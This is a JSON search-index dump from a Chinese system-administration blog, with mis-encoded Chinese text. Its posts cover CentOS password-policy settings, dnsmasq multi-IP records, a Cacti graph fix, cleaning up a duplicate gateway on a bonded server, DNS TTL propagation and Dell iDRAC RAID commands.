class=\"nv\"\u003eauthtok_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåé¢åŠ ä¸Šï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e12\u003c/span\u003e \u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 enforce_for_root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¿®æ”¹æˆä¸ºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epassword    requisite     pam_pwquality.so try_first_pass local_users_only \u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nv\"\u003eauthtok_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e12\u003c/span\u003e \u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 \u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1 enforce_for_root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ„æ€æ˜¯ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¯†ç é•¿åº¦12ï¼Œé¡»åŒ…å«ï¼šä¸€ä¸ªå°å†™å­—ç¬¦ï¼Œä¸€ä¸ªå¤§å†™å­—ç¬¦ï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¼ºåˆ¶rootä¹Ÿéµå®ˆæ­¤è§„åˆ™\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‚æ•°å…¨éƒ¨è§£é‡Šå¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eretry\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This option will prompt the user \u003cspan class=\"m\"\u003e3\u003c/span\u003e \u003cspan class=\"nb\"\u003etimes\u003c/span\u003e before exiting and returning an error.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eminlen\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e12: This specifies that the password cannot be less than \u003cspan class=\"m\"\u003e12\u003c/span\u003e characters.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emaxrepeat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This allows implies that only a maximum of \u003cspan class=\"m\"\u003e3\u003c/span\u003e repeated characters can be included in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eucredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one uppercase character in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003elcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one lowercase character in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edcredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: This implies that the password should have at last a numeric character.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eocredit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e-1: The option requires at least one special character included in the password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003edifok\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e3: This implies that only a  maximum of \u003cspan class=\"m\"\u003e3\u003c/span\u003e character changes in the new password should be present in the old password.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereject_username: The option rejects a password \u003cspan class=\"k\"\u003eif\u003c/span\u003e it consists of the username either in its normal way or in reverse.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenforce_for_root: This ensures that the password policies are adhered to even \u003cspan class=\"k\"\u003eif\u003c/span\u003e itâ€™s the root user configuring the passwords.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"åˆè§„è¦æ±‚ä¹‹CentOS7çš„ç”¨æˆ·å¯†ç ç­–ç•¥"},{"content":"ä¸€ï¼šä»‹ç»ï¼š DNSMasqä¸»è¦ç”¨æ¥è§£å†³å†…ç½‘DNSåŸŸåç¼“å­˜ã€DHCPã€ç½‘ç»œå¯åŠ¨å’Œè·¯ç”±é€šå‘ŠåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯å°†DNSMasqä½œä¸ºå†…ç½‘DNSåŸŸååŠ«æŒä½¿ç”¨\nç³»ç»Ÿç¯å¢ƒï¼šcentos7.6 éœ€æ±‚ï¼šä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip ä¸»æœºipï¼šï¼ˆå†…ç½‘ä¸»æœº172.18.30.1å’Œ172.18.30.2ï¼‰\näºŒï¼šé…ç½®æ–¹æ³• 1ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®åˆ°/etc/dnsmasq.conf addn-hosts=/etc/ty.ddky.local\naddn-hostsï¼šå¦‚æœè¦æ”¯æŒä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ª IPï¼Œå°±å¿…é¡»ç”¨ addn-hosts é€‰é¡¹\n2ï¼Œ/etc/ty.ddky.local æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 172.18.33.100 ty.ddky.local 172.18.33.104 ty.ddky.local\n3ï¼Œä¿®æ”¹å®Œæˆåé‡å¯ DNSMasq systemctl restart dnsmasq.service\n","permalink":"https://rendoumi.com/posts/20221219-dnsmqsq_multi_ip/","summary":"\u003cp\u003eä¸€ï¼šä»‹ç»ï¼š\nDNSMasqä¸»è¦ç”¨æ¥è§£å†³å†…ç½‘DNSåŸŸåç¼“å­˜ã€DHCPã€ç½‘ç»œå¯åŠ¨å’Œè·¯ç”±é€šå‘ŠåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯å°†DNSMasqä½œä¸ºå†…ç½‘DNSåŸŸååŠ«æŒä½¿ç”¨\u003c/p\u003e\n\u003cp\u003eç³»ç»Ÿç¯å¢ƒï¼šcentos7.6\néœ€æ±‚ï¼šä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip\nä¸»æœºipï¼šï¼ˆå†…ç½‘ä¸»æœº172.18.30.1å’Œ172.18.30.2ï¼‰\u003c/p\u003e\n\u003cp\u003eäºŒï¼šé…ç½®æ–¹æ³•\n1ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®åˆ°/etc/dnsmasq.conf\naddn-hosts=/etc/ty.ddky.local\u003c/p\u003e\n\u003cp\u003eaddn-hostsï¼šå¦‚æœè¦æ”¯æŒä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ª IPï¼Œå°±å¿…é¡»ç”¨ addn-hosts é€‰é¡¹\u003c/p\u003e\n\u003cp\u003e2ï¼Œ/etc/ty.ddky.local æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n172.18.33.100  ty.ddky.local\n172.18.33.104  ty.ddky.local\u003c/p\u003e\n\u003cp\u003e3ï¼Œä¿®æ”¹å®Œæˆåé‡å¯ DNSMasq\nsystemctl restart dnsmasq.service\u003c/p\u003e","title":"Dnsmasqé…ç½®ä¸€ä¸ªåŸŸåå¯¹åº”å¤šä¸ªip"},{"content":"ç½‘ç»œå·¥ç¨‹å¸ˆé€‰æ‹©ç½‘ç»œè®¾å¤‡çš„ç›‘æ§å·¥å…·æ˜¯è€ç‰Œçš„cactiï¼Œå½“ç„¶ä½œä¸ºç³»ç»Ÿå·¥ç¨‹å¸ˆçš„æˆ‘ï¼Œè¿˜æ˜¯è§‰å¾—librenmsæ˜¯ä¸ªå¥½é€‰æ‹©ï¼Œä½†æ˜¯ï¼Œlibrenmsä¼šå¯¹ç½‘ç»œè®¾å¤‡cpué€ æˆæ¯”è¾ƒå¤§çš„å‹åŠ›ã€‚é‚£è¿˜æ˜¯éµä»ä»–çš„é€‰æ‹©ï¼Œæœ€è¿‘ç½‘å·¥æŠ¥å‘Šè¯´ï¼š\né€‰æ‹©å›¾å½¢çš„æ—¶å€™æ—¶é—´Filterå¤±æ•ˆäº†ã€‚é€‰æ‹©äº†ä»¥åå›¾å½¢æ— å˜åŒ–ï¼Œå´©æºƒï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œéƒ½ä¸Šå¤çš„ç©æ„äº†ã€‚\nä¿®æ”¹æ–¹æ³•ï¼š\nä¿®æ”¹graph_image.php\nunixtime = 1600000000ï¼Œä¹Ÿå°±æ˜¯åˆ° 2020-09-13 20:26:40ã€‚æ”¾å¤§åˆ° 2600000000ï¼Œä¹Ÿå°±æ˜¯åˆ°2052-05-22 22:13:20ï¼Œå†™è¿™ä¸ªphpç¨‹åºçš„äººé˜²è¶Šç•Œï¼Œå´æ²¡æƒ³åˆ°æ—¶é—´çœŸçš„æ¥åˆ°äº†è¿™ä¸ªèŠ‚ç‚¹ã€‚\næ³¨ï¼šUnix æ—¶é—´æˆ³æ˜¯ä»1970å¹´1æœˆ1æ—¥ï¼ˆUTC/GMTçš„åˆå¤œï¼‰å¼€å§‹æ‰€ç»è¿‡çš„ç§’æ•°ï¼Œä¸è€ƒè™‘é—°ç§’ã€‚\n","permalink":"https://rendoumi.com/posts/20221218-cacti_time_filter/","summary":"\u003cp\u003eç½‘ç»œå·¥ç¨‹å¸ˆé€‰æ‹©ç½‘ç»œè®¾å¤‡çš„ç›‘æ§å·¥å…·æ˜¯è€ç‰Œçš„cactiï¼Œå½“ç„¶ä½œä¸ºç³»ç»Ÿå·¥ç¨‹å¸ˆçš„æˆ‘ï¼Œè¿˜æ˜¯è§‰å¾—librenmsæ˜¯ä¸ªå¥½é€‰æ‹©ï¼Œä½†æ˜¯ï¼Œlibrenmsä¼šå¯¹ç½‘ç»œè®¾å¤‡cpué€ æˆæ¯”è¾ƒå¤§çš„å‹åŠ›ã€‚é‚£è¿˜æ˜¯éµä»ä»–çš„é€‰æ‹©ï¼Œæœ€è¿‘ç½‘å·¥æŠ¥å‘Šè¯´ï¼š\u003c/p\u003e\n\u003cp\u003eé€‰æ‹©å›¾å½¢çš„æ—¶å€™æ—¶é—´Filterå¤±æ•ˆäº†ã€‚é€‰æ‹©äº†ä»¥åå›¾å½¢æ— å˜åŒ–ï¼Œå´©æºƒï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œéƒ½ä¸Šå¤çš„ç©æ„äº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eä¿®æ”¹graph_image.php\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-cacti_time_filter/2021-01-20_190434.png\"\u003e\u003c/p\u003e\n\u003cp\u003eunixtime = 1600000000ï¼Œä¹Ÿå°±æ˜¯åˆ° 2020-09-13 20:26:40ã€‚æ”¾å¤§åˆ° 2600000000ï¼Œä¹Ÿå°±æ˜¯åˆ°2052-05-22 22:13:20ï¼Œå†™è¿™ä¸ªphpç¨‹åºçš„äººé˜²è¶Šç•Œï¼Œå´æ²¡æƒ³åˆ°æ—¶é—´çœŸçš„æ¥åˆ°äº†è¿™ä¸ªèŠ‚ç‚¹ã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨ï¼šUnix æ—¶é—´æˆ³æ˜¯ä»1970å¹´1æœˆ1æ—¥ï¼ˆUTC/GMTçš„åˆå¤œï¼‰å¼€å§‹æ‰€ç»è¿‡çš„ç§’æ•°ï¼Œä¸è€ƒè™‘é—°ç§’ã€‚\u003c/p\u003e","title":"è€ç‰ˆæœ¬cactiçš„å›¾å½¢filterçªç„¶å¤±æ•ˆçš„è§£å†³åŠæ³•"},{"content":"çº¿ä¸ŠæœåŠ¡å™¨172.18.30.67 æœ‰4ä¸ªç½‘å£\nå…¶ä¸­eno1å’Œeno2æ˜¯ä¸¤ä¸ªå…‰çº¤ä¸‡å…†å£ï¼Œenp26s0f0å’Œenp26s0f1æ˜¯ä¸¤ä¸ªä»¥å¤ªåƒå…†ç½‘å£ã€‚\neno2ç½‘å¡åœ¨æ²¡åšbondingçš„æ—¶å€™ï¼Œé€šè¿‡NetworkManagerçš„dhcpè·å¾—äº†åœ°å€ã€‚ç„¶åeno1å’Œeno2åšäº†bondingï¼Œä½†æ˜¯eno2å®é™…è¿˜åœ¨å•ç‹¬èµ·ä½œç”¨ï¼Œbondingååœ°å€æ²¡å»æ‰ï¼Œå¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ã€‚è·¯ç”±è¡¨å¦‚ä¸‹ï¼š\n[root@renhe-18-30-67 ~]# ip r\rdefault via 172.18.29.254 dev eno2 default via 172.18.31.254 dev br0.199 proto static metric 426 172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1 eno2æ˜¯ä»dhcpè·å¾—äº†172.18.28.67çš„åœ°å€\nip a\reno2: flags=6211\u0026lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST\u0026gt; mtu 1500\rinet 172.18.28.67 netmask 255.255.254.0 broadcast 172.18.29.255\rether b4:05:5d:08:e0:d8 txqueuelen 1000 (Ethernet)\rRX packets 81768780 bytes 5398659503 (5.0 GiB)\rRX errors 0 dropped 7 overruns 0 frame 0\rTX packets 10044620 bytes 467566304 (445.9 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 è¿™ç§æƒ…å†µä¸‹ï¼Œå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\nbondingçš„æ¨¡å¼æ˜¯ ç‰©ç†ç½‘å¡ \u0026ndash;\u0026gt; bond \u0026ndash;\u0026gt; bond.xxx \u0026ndash;\u0026gt;br.xxx\nå…ˆæŸ¥bondingæ¨¡å¼:\ncat /sys/class/net/bond0/bonding/mode\ractive-backup 1 å†çœ‹bondingç½‘å¡çŠ¶æ€ï¼š\ncat /proc/net/bonding/bond0\rEthernet Channel Bonding Driver: v3.7.1 (April 27, 2011)\rBonding Mode: fault-tolerance (active-backup)\rPrimary Slave: eno1 (primary_reselect always)\rCurrently Active Slave: eno1\rMII Status: up\rMII Polling Interval (ms): 100\rUp Delay (ms): 0\rDown Delay (ms): 0\rSlave Interface: eno1\rMII Status: up\rSpeed: 10000 Mbps\rDuplex: full\rLink Failure Count: 1\rPermanent HW addr: b4:05:5d:08:e0:d8\rSlave queue ID: 0\rSlave Interface: eno2\rMII Status: up\rSpeed: 10000 Mbps\rDuplex: full\rLink Failure Count: 1\rPermanent HW addr: b4:05:5d:08:e0:d9\rSlave queue ID: 0 å†æ¬¡ç¡®è®¤active\ncat /sys/class/net/bond0/bonding/active_slave\reno1 å†ç¡®è®¤ç¬¬äºŒä¸ªdefaultç½‘å…³æœ‰æ•ˆ\nping -I br0.199 172.18.31.254 ä»ä»¥ä¸Šå¯ä»¥ç¡®å®šä¸»ç½‘å¡æ˜¯eno1ï¼Œshutdownäº†eno2ä¸ä¼šå½±å“ä»»ä½•ä¸œè¥¿ã€‚\næ¥ä¸‹æ¥çš„æ­¥éª¤ï¼š\nå…ˆæŸ¥å‡ºæ¥dhclientçš„è¿›ç¨‹å·ï¼Œæ˜¯2252\n1 2252 2252 2252 ? -1 Ss 0 8:50 /sbin/dhclient -1 -q -lf /var/lib/dhclient/dhclient--eno2.lease -pf /var/run/dhclient-eno2.pid -H renhe-18-30-67 eno2 ç„¶åå¤„ç†ï¼š\nsystemctl stop NetworkManager\rsystemctl disable NetworkManager\r# æ€æ‰dhclient\rkill -9 2252 è¿™æ ·eno2çš„ipåœ°å€åœ¨è¿‡ä¸€æ®µæ—¶é—´åä¼šæ¶ˆå¤±æ‰ã€‚\nå¦‚æœä¸æ¶ˆå¤±ï¼š\nip link set eno2 down ç„¶åç­‰ç­‰\nip link set eno2 up å°±å¯ä»¥äº†ã€‚\nç”±äºæ˜¯çº¿ä¸ŠæœåŠ¡å™¨ï¼Œæ— æ³•åœæœºï¼Œæ‰€ä»¥æ“ä½œæ‰æå¾—è¿™ä¹ˆå°å¿ƒè°¨æ…ã€‚\n","permalink":"https://rendoumi.com/posts/20221218-multi_gateway/","summary":"\u003cp\u003eçº¿ä¸ŠæœåŠ¡å™¨172.18.30.67 æœ‰4ä¸ªç½‘å£\u003c/p\u003e\n\u003cp\u003eå…¶ä¸­eno1å’Œeno2æ˜¯ä¸¤ä¸ªå…‰çº¤ä¸‡å…†å£ï¼Œenp26s0f0å’Œenp26s0f1æ˜¯ä¸¤ä¸ªä»¥å¤ªåƒå…†ç½‘å£ã€‚\u003c/p\u003e\n\u003cp\u003eeno2ç½‘å¡åœ¨æ²¡åšbondingçš„æ—¶å€™ï¼Œé€šè¿‡NetworkManagerçš„dhcpè·å¾—äº†åœ°å€ã€‚ç„¶åeno1å’Œeno2åšäº†bondingï¼Œä½†æ˜¯eno2å®é™…è¿˜åœ¨å•ç‹¬èµ·ä½œç”¨ï¼Œbondingååœ°å€æ²¡å»æ‰ï¼Œå¯¼è‡´æœ‰ä¸¤ä¸ªç½‘å…³ã€‚è·¯ç”±è¡¨å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e[root@renhe-18-30-67 ~]# ip r\r\ndefault via 172.18.29.254 dev eno2 \r\ndefault via 172.18.31.254 dev br0.199 proto static metric 426 \r\n172.18.28.0/23 dev eno2 proto kernel scope link src 172.18.28.67 \r\n172.18.30.0/23 dev br0.199 proto kernel scope link src 172.18.30.67 metric 426 \r\n192.168.122.0/24 dev virbr0 proto kernel scope link src 192.168.122.1\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eeno2æ˜¯ä»dhcpè·å¾—äº†172.18.28.67çš„åœ°å€\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eip a\r\neno2: flags=6211\u0026lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST\u0026gt;  mtu 1500\r\n        inet 172.18.28.67  netmask 255.255.254.0  broadcast 172.18.29.255\r\n        ether b4:05:5d:08:e0:d8  txqueuelen 1000  (Ethernet)\r\n        RX packets 81768780  bytes 5398659503 (5.0 GiB)\r\n        RX errors 0  dropped 7  overruns 0  frame 0\r\n        TX packets 10044620  bytes 467566304 (445.9 MiB)\r\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™ç§æƒ…å†µä¸‹ï¼Œå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"çº¿ä¸ŠæœåŠ¡å™¨å‡ºç°å¤šç½‘å…³é—®é¢˜çš„å¤„ç†"},{"content":"114.114.114.114 è¿™ä¸ªDNSä¿®æ”¹è®°å½•ç­‰å¾…çš„ç”Ÿæ•ˆæ—¶é—´éå¸¸çš„é•¿ï¼Œè¿œè¿œè¶…å‡ºäº†TTLçš„æ—¶é•¿ï¼ŒåŸºæœ¬æ˜¯ä½ è®¾ç½®TTLæ—¶é—´çš„6å€ã€‚\nè¿™æ˜¯ä¸Šæ¬¡æˆ‘ä»¬å‰²æ¥å¾—åˆ°çš„æ•™è®­å•Šã€‚æˆ‘ä»¬è¦å‰²æ¥m.ddky.comçš„åŸŸåã€‚\næ³¨ï¼šåœ¨ä¿®æ”¹m.ddky.comçš„è®°å½•å‰ï¼Œå·²ç»æŠŠddky.comçš„m.ddky.comçš„TTLæ”¹æˆäº†1åˆ†é’Ÿï¼Œæ­£å¸¸çš„æ¥è¯´ï¼Œç¬¬ä¸€è½®1åˆ†é’Ÿå†…ä¸æ›´æ–°ï¼Œç¬¬äºŒè½®2åˆ†é’Ÿå†…ä¹Ÿåº”è¯¥æ›´æ–°äº†ã€‚\nçœ‹ä¸‹å›¾ï¼Œåœ¨å¸¦å¤–æœºä¸Šåšçš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ—¶å€™8.8.8.8å’Œ223.5.5.5éƒ½å·²ç»ç”Ÿæ•ˆäº†ï¼Œå˜æˆäº†å¸è”çš„åœ°å€ã€‚\n06:06:57 åšäº†æŸ¥è¯¢ï¼Œå»æ‰å°æ—¶ï¼Œ06ï¼š57å®šä¹‰ä¸ºèµ·å§‹æ—¶é—´ã€‚ ä¸€ç›´åˆ° 12:22 åˆ†è¿˜æ²¡æœ‰å˜è¿‡æ¥ï¼Œå¤§æ¦‚ 13:00 å˜è¿‡æ¥\nèµ·å§‹ 06:57 \u0026ndash; 13:00 ï¼Œä¸€å…±ç”¨äº†6åˆ†é’Ÿã€‚è€ŒTTLæ˜¯1åˆ†é’Ÿï¼Œæ‰€ä»¥åŸºæœ¬æ˜¯6å€æ—¶é—´ã€‚\nå¾€å‰æ¨æµ‹5æœˆ25æ—¥çš„DNSå‰²æ¥ï¼ŒTTLæ˜¯10åˆ†é’Ÿï¼Œ6å€ï¼Œå°±æ˜¯60åˆ†é’Ÿï¼ŒåŸºæœ¬å»åˆã€‚\nå¦‚æœæƒ³è®©DNSå°½å¿«ç”Ÿæ•ˆï¼ŒTTLæ”¹æˆ10ç§’æ˜¯æé™äº†ã€‚ ","permalink":"https://rendoumi.com/posts/20221218-dns_114/","summary":"\u003cp\u003e114.114.114.114 è¿™ä¸ªDNSä¿®æ”¹è®°å½•ç­‰å¾…çš„ç”Ÿæ•ˆæ—¶é—´éå¸¸çš„é•¿ï¼Œè¿œè¿œè¶…å‡ºäº†TTLçš„æ—¶é•¿ï¼ŒåŸºæœ¬æ˜¯ä½ è®¾ç½®TTLæ—¶é—´çš„6å€ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ˜¯ä¸Šæ¬¡æˆ‘ä»¬å‰²æ¥å¾—åˆ°çš„æ•™è®­å•Šã€‚æˆ‘ä»¬è¦å‰²æ¥m.ddky.comçš„åŸŸåã€‚\u003c/p\u003e\n\u003cp\u003eæ³¨ï¼šåœ¨ä¿®æ”¹m.ddky.comçš„è®°å½•å‰ï¼Œå·²ç»æŠŠddky.comçš„m.ddky.comçš„TTLæ”¹æˆäº†1åˆ†é’Ÿï¼Œæ­£å¸¸çš„æ¥è¯´ï¼Œç¬¬ä¸€è½®1åˆ†é’Ÿå†…ä¸æ›´æ–°ï¼Œç¬¬äºŒè½®2åˆ†é’Ÿå†…ä¹Ÿåº”è¯¥æ›´æ–°äº†ã€‚\u003c/p\u003e\n\u003cp\u003eçœ‹ä¸‹å›¾ï¼Œåœ¨å¸¦å¤–æœºä¸Šåšçš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ—¶å€™8.8.8.8å’Œ223.5.5.5éƒ½å·²ç»ç”Ÿæ•ˆäº†ï¼Œå˜æˆäº†å¸è”çš„åœ°å€ã€‚\u003c/p\u003e\n\u003cp\u003e06:06:57 åšäº†æŸ¥è¯¢ï¼Œå»æ‰å°æ—¶ï¼Œ06ï¼š57å®šä¹‰ä¸ºèµ·å§‹æ—¶é—´ã€‚\n\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_480_1593442420.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_481_1593442678.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_482_1593442695.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_483_1593442708.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20221218-dns_114/%E9%80%89%E5%8C%BA_484_1593442728.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸€ç›´åˆ° 12:22 åˆ†è¿˜æ²¡æœ‰å˜è¿‡æ¥ï¼Œå¤§æ¦‚ 13:00 å˜è¿‡æ¥\u003c/p\u003e\n\u003cp\u003eèµ·å§‹ 06:57 \u0026ndash; 13:00 ï¼Œä¸€å…±ç”¨äº†6åˆ†é’Ÿã€‚è€ŒTTLæ˜¯1åˆ†é’Ÿï¼Œæ‰€ä»¥åŸºæœ¬æ˜¯6å€æ—¶é—´ã€‚\u003c/p\u003e\n\u003cp\u003eå¾€å‰æ¨æµ‹5æœˆ25æ—¥çš„DNSå‰²æ¥ï¼ŒTTLæ˜¯10åˆ†é’Ÿï¼Œ6å€ï¼Œå°±æ˜¯60åˆ†é’Ÿï¼ŒåŸºæœ¬å»åˆã€‚\u003c/p\u003e\n\u003ch1 id=\"å¦‚æœæƒ³è®©dnså°½å¿«ç”Ÿæ•ˆttlæ”¹æˆ10ç§’æ˜¯æé™äº†\"\u003eå¦‚æœæƒ³è®©DNSå°½å¿«ç”Ÿæ•ˆï¼ŒTTLæ”¹æˆ10ç§’æ˜¯æé™äº†ã€‚\u003c/h1\u003e","title":"114dnsçš„ttlè¶…æ—¶çš„æ•™è®­"},{"content":"é¦–å…ˆsshåˆ°idracå»ï¼Œç›´æ¥ä¼šè¿›å…¥racadmçš„ç•Œé¢\næˆ‘ä»¬ä»¥2022å¹´æœ€æ–°çš„dellæœºå™¨ä¸ºä¾‹ï¼Œè€çš„æœºå™¨æ˜¾ç¤ºçš„ä¸œè¥¿ä¸ä¸€è‡´\nssh 10.18.30.104 Password: racadm\u0026gt;\u0026gt; æ³¨æ„ï¼Œshellå‘½ä»¤æœ‰è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½ï¼ŒæŒ‰ä¸¤ä¸‹tabé”®ä¼šè‡ªåŠ¨è¡¥\nåšraidçš„å…¨éƒ¨å‘½ä»¤éƒ½åœ¨storageçš„å­å‘½ä»¤ä¸‹\nä¸€ã€é¦–å…ˆæ‹¿åˆ°raidå¡çš„åç§°ï¼š\nracadm\u0026gt;\u0026gt;storage get controllers RAID.Slot.1-1 AHCI.Embedded.2-1 AHCI.Embedded.1-1 RAID.Slot.1-1 æ˜¯Raidå¡æ§åˆ¶å™¨åç§°ï¼Œä¸‹é¢ä¸¤ä¸ªæ˜¯ä¸»æ¿å†…ç½®çš„ï¼Œå¿½ç•¥ã€‚\näºŒã€ç„¶åæ‹¿åˆ°æ‰€æœ‰ç‰©ç†ç›˜çš„åç§°ï¼š\nracadm\u0026gt;\u0026gt;storage get pdisks Disk.Bay.0:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.1:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.2:Enclosure.Internal.0-1:RAID.Slot.1-1 Disk.Bay.3:Enclosure.Internal.0-1:RAID.Slot.1-1 